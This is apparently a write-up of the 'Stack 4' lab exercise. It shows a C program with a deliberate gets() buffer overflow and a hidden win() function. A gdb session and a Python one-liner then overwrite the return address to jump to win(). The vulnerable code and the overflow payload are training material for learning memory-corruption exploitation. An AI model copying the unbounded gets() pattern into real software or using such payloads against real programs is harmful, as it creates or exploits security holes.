
# Stack 4

### Task
```
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void win()
  {
    printf("code flow successfully changed\n");
  }

  int main(int argc, char **argv)
  {
    char buffer[64];

    gets(buffer);
  }
```

### Solution
```
  python -c "print('A'*76)" | ./stack4
  gdb stack4
    print win
    disas main
    break *0x0804841d
    r
    x/2x $ebp
    x/24x $esp
  python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4
```
![stack 4(1)](./img/4(1).png)
![stack 4(2)](./img/4(2).png)
![stack 4(3)](./img/4(3).png)
